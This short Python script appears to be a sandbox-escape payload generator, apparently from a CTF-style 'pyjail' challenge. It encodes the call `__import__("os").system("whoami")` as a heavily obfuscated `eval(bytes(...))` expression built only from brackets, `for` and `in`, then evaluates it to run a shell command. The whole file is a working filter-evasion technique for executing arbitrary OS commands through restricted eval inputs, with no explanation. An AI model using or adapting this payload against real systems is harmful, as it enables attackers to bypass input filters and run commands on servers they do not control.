exp = '__import__("os").system("whoami")'

a = f"eval(bytes([[j][0]for(i)in[range({len(exp)})][0]for(j)in[range(256)][0]if["+"]]or[".join([f"i]in[[{i}]]and[j]in[[{ord(j)}" for i, j in enumerate(exp)]) + "]]]))"

print(eval(a))